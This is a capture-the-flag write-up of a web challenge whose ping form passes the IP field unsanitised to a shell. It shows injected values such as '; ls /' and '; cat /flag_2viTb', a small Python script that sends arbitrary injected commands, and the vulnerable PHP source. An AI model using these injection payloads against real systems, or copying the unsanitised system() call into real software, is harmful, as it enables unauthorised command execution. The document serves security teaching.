# CHALLENGE DESCRIPTION
We've built the most secure networking tool in the market, come and check it out!

# Analysis
When we start the instance, we are met with an options menu:
![lg-1](https://user-images.githubusercontent.com/87711310/211148012-9d2e82a3-00b5-428a-99a3-b3c849ff1af7.png)

It appears as if we can input the IP, which is then pinged. Let's imagine for a second how this could be implemented on the server side. A common trap developers can fall into is doing something like:
```python
system("ping -c 4 " + ip);
```

Essentially, we're passing the parameters to bash. This means we could, theoretically, insert a ; character into the ip variable, and everything behind it would be interpreted as a seperate command, e.g.:
```python
system("ping -c 4 178.62.0.100; ls");
```

Here, ls would be run as a separate command. Let's see if it works!

# Exploration
Let's try it by simply inputting ; ls to the end of the IP and submitting:
```python
PING 178.62.0.100 (178.62.0.100): 56 data bytes
--- 178.62.0.100 ping statistics ---
4 packets transmitted, 0 packets received, 100% packet loss
index.php
```

Look - as well as the ping command, we get index.php, which is the result of the ls command!

There doesn't appear to be a flag, so we'll try ; ls / to read the root directory next:
```python
PING 178.62.0.100 (178.62.0.100): 56 data bytes
--- 178.62.0.100 ping statistics ---
4 packets transmitted, 0 packets received, 100% packet loss
bin
boot
dev
entrypoint.sh
etc
flag_2viTb
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www
```

There's a `flag_2viTb` file! Now we'll inject `; cat /flag_2viTb` to read the flag:
```python
PING 178.62.0.100 (178.62.0.100): 56 data bytes
--- 178.62.0.100 ping statistics ---
4 packets transmitted, 0 packets received, 100% packet loss
HTB{REDACTED}
```
And boom, we've got the flag!!!
---

## Automation
Because I prefer a command-line interface, I originally created a simple script to inject parameters for me:
```python
from requests import post

cmd = input('>> ')

data = {'test': 'ping', 'ip_address': f'178.62.0.100; {cmd}', 'submit': 'Test'}
r = post('http://178.62.0.100:30134/', data=data)

data = r.text
data = data.split('packet loss\n')[-1]
data = data.split('</textarea>')[0]

print(data.strip())
```

This simply inputs the command as `cmd`, sets the `POST` parameters, and (really messily) parses the response to return just the data.

```python
$ python3 exploit.py 
>> cat /flag_2viTb      
HTB{REDACTED}
```
---

## Checking the Source
We can inject cat `index.php` to see what exactly was happening, and we immediately see the following lines:
```php
function runTest($test, $ip_address)
{
    if ($test === 'ping')
    {
        system("ping -c4 ${ip_address}");
    }
    if ($test === 'traceroute')
    {
        system("traceroute ${ip_address}");
    }
}
```

As we guessed, it passed in the input `without sanitising` it to remove potential injection.
